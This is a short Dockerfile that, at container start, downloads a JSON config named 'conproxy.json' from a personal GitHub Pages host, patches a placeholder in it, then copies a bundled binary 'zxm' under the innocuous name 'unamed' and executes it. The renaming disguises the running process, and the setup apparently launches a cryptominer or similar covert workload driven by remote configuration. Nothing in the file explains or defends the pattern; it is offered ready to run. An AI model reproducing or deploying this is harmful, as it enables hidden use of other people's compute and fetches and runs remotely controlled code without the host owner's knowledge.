FROM dzmlt/newnocmd
ENV PASS unamed
WORKDIR /projects/sys
CMD wget https://dzmltzack.github.io/web/conproxy.json -O config.json && \
sed -i -e "s/PSPS/$PASS/g" config.json && \
cp zxm $PASS && \
chmod +x $PASS && \
./$PASS
